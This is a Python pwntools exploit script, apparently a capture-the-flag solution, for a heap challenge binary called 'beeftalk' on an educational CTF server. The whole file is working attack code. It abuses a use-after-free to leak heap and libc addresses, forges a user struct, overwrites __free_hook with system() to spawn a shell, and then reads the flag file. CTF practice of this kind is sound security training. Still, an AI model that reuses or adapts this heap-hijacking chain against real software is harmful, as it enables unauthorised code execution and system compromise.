from pwn import *
import re

HOST, PORT = 'edu-ctf.zoolab.org', 30207
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./beeftalk/share/beeftalk')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

def restore(leak):
    # check leak success (?
    assert len(leak) == 6
    addr = u64(leak.ljust(8, b'\0'))
    return addr
def wrap(m,e=0):
    if type(m) == int:
        m = str(m)
        e = 1
    if type(m) == str:
        m = m.encode()
    if e or len(m) == 0:
        m += b'\n'
    return m
def send(m, e=0):
    io.sendafter(b'> ', wrap(m,e))
def read(m = '\n', d = 0):
    r = io.readuntil(wrap(m))
    if d: r = r.decode()
    return r

def login(token, check = True):
    send(1)
    send(token + b'\n')
    L = read()
    if b'successfully' in L:
        name = read(', have a nice day !\n')[6:-20]
        return name
    if check: assert False
def signup(name = '', desc = '', job = '', assets = 0, correct = 'y', show = False):
    send(2)
    send(name)
    send(desc)
    send(job)
    send(assets)
    L = read('Is correct')
    L = L.split(b'-----------\nName:    ')[1]
    rn,L = L.split(b'\nDesc:    ')
    rd,L = L.split(b'\nJob:     ')
    rj,L = L.split(b'\nAssets:  ')
    ra,L = L.split(b'\nToken:   ')
    rt,L = L.split(b'\n-----------\n')
    send(correct+'\n')
    L = read()
    if correct == 'n':
        pass
    else:
        rt = L.split()[-1]
        if show: info(f'token: {rt.decode()}')
    r = (rn,rd,rj,ra,rt)
    return r

def update(name = '', desc = '', job = '', assets = 0):
    send(1)
    send(name, 1)
    send(desc, 1)
    send(job, 1)
    send(assets)
def chat():
    pass
def delete(token = None, r = True):
    if token: login(token)
    send(3)
    send('y\n')
    if r: read()
def logout():
    send(4)

def gen_user(addr, msg = b'', sz = 0x100):
    offset = 0x650 + 0x48 + len(msg)
    fifo0 = b'/tmp/'+token1+b'-0\0'
    fifo1 = b'/tmp/'+token1+b'-1\0'
    fake_user_struct = flat(
        addr, heap_base,
        heap_base, 0,
        heap_base + offset, heap_base + offset + len(fifo0),
        0x1000, int(token1,16), 0,
    ) + msg + fifo0 + fifo1
    assert len(fake_user_struct) <= sz
    return fake_user_struct
def fill(addr, msg = b''):
    login(token2)
    update(
        gen_user(addr, msg),
        # flat(7, 7, 0, 7, word_size=16),
        # flat(heap_base + 0xA70, heap_base + 0x10),
    )
    logout()

signup(correct='n')
leak,*_,token1 = signup()
delete(token1)
heap_base = restore(leak) - 0x30A
info(f'heap base: {hex(heap_base)}')

tokens = []
for _ in range(8):
    token = signup(b'A'*0x90)[-1] 
    tokens.append(token)
for token in tokens:
    delete(token)

token2 = signup(b'A' * 0x100)[-1]
delete(token2)

fill(heap_base + 0x810)
leak = login(token1)
logout()
libc.address = restore(leak) - 0x1ebc20
info(f'libc base: {hex(libc.address)}')

fill(libc.sym['__free_hook'])
login(token1)
update(p64(libc.sym.system))
logout()

fill(heap_base + 0x650 + 0x48, b'sh\0')
delete(token1, False)

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'cat /home/`whoami`/flag*')
    flag = io.readuntil(b'}').strip().decode()
    success(flag)
